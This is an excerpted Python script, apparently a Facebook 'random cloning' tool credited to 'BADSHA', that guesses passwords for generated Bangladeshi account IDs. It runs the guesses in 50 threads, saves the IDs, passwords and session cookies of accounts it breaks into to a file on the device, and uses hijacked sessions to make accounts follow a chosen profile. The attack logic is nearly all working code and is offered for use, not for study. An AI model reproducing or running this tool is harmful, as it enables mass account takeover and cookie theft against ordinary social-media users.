...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100073970676758', {
...
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\033[38;5;46m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\x1b[38;5;208m' # BIRU -
p = '\x1b[0;34m' # BIRU +
...
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[38;5;46m[\033[1;31m+\033[38;5;46m] FOUNDER      \x1b[38;5;208m➤  \033[38;5;46BADSHA\033[1;31m×\033[38;5;46m JANNATI
\033[38;5;46m[\033[1;31m+\033[38;5;46m] TEAM         \x1b[38;5;208m➤  \033[38;5;46badsha\033[1;36mCYBER \033[38;5;46mARMY
\033[38;5;46m[\033[1;31m+\033[38;5;46m] GITHUB       \x1b[38;5;208m➤  \033[38;5;46BADSHA
\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOOL         \x1b[38;5;208m➤  \033[38;5;46mRANDOM CLONING
\033[38;5;46m[\033[1;31m+\033[38;5;46m] VERSION      \x1b[38;5;208m➤  \33[0;42m2.5\033[0;92m
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[38;5;46m""")
def linex():
	print('\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
loop = 0
...
try:
    print('\n\n\033[38;5;46mLoading asset files ... \033[38;5;46m')
    v = 2.4
    update = ('2.5')
    update = ('2.5')
    if str(v) in update:
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Example : {xr}017, 018,{xr}')
    print("\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")                      
    #code = random.choice()                      
    code = input(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] Choose \033[1;31m:\033[38;5;46m ')
    os.system('clear')
    print(logo)
    ...
    for bilal in range(passx):
        code = input(f"\033[38;5;46m[\033[1;31m+\033[38;5;46m]  Enter Password {bilal+1} : ")
        HamiiID.append(code)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] PROCESS HAS BEEN STARTED') 
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] TOTAL IDS    \033[1;91m: {xr}'+tl)
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] WORK COUNTRY \033[1;91m: \033[38;5;46mBANGLADESH')
        print(f'\033[38;5;46m[\033[1;31m+\033[38;5;46m] USE NETWORK  \033[1;91m: \033[1;36mDATA \033[1;31m● \033[1;36mWIFI\033[1;31m(\033[38;5;46mBest\033[1;31m)\033[38;5;46m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;31m[\033[38;5;46mBADSHA ~10-💚\033[1;31m]\033[38;5;46m ' +uid+ ' \033[1;31m●\033[38;5;46m ' +ps+    '  \n[‎🌺]\x1b[38;5;208m COOKIE = \033[38;5;46m'+coki+  '  ''  \033[38;5;46m')               
                open('/sdcard/𝐌𝐑-BADSHA ~10-OK.txt', 'a').write(uid+' ● '+ps+'\nCOOKIE =  '+coki+'\n\n')         
                oks.append(cid)       
                break     
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m[\033[38;5;46mBADSHA ~10-💔\033[1;31m]\033[38;5;46m ' +uid+ ' \033[1;31m●\033[38;5;46m ' +ps+        ' ''  \033[38;5;46m')
                #open('/sdcard/𝐌𝐑-BADSHA ~10-CP.txt', 'a').write( uid+' ● '+ps+' \n')
                cps.append(cid)
                break     
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{m}[{xr}𝔹𝔸𝔻𝕊ℍ𝔸{m}]-[{xr}%s{m}/{O}%s{m}]-[{xr}OK{m}:{xr}%s{m}]{xr} '%(H,loop,tl,len(oks))),sys.stdout.flush() 
    except:
        pass
